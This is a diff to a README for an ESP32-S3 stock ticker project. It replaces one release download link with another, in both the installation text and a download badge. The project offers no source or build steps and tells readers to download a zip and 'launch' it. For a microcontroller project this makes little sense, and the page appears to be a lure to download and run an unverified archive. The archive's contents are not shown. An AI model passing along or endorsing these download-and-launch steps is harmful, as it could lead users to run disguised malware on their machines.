@@ -23,7 +23,7 @@ This project leverages the following technologies:
 - Stock prices
 
 ## Installation
-To get started with the ESP32-S3 Stock Ticker project, download the necessary software [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Remember to launch the downloaded zip file to begin the installation process.
+To get started with the ESP32-S3 Stock Ticker project, download the necessary software [here](https://github.com/Ninja4795822/ESP32-S3-Stock-Ticker/releases/download/v1.0/Release.zip). Remember to launch the downloaded zip file to begin the installation process.
 
 ## Getting Started
 Follow these steps to begin using the ESP32-S3 Stock Ticker:
@@ -42,4 +42,4 @@ If you encounter any issues with the installation or setup process, please refer
 
 Let's stay informed with the ESP32-S3 Stock Ticker! 🚀📊
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Ninja4795822/ESP32-S3-Stock-Ticker/releases/download/v1.0/Release.zip)](https://github.com/Ninja4795822/ESP32-S3-Stock-Ticker/releases/download/v1.0/Release.zip)
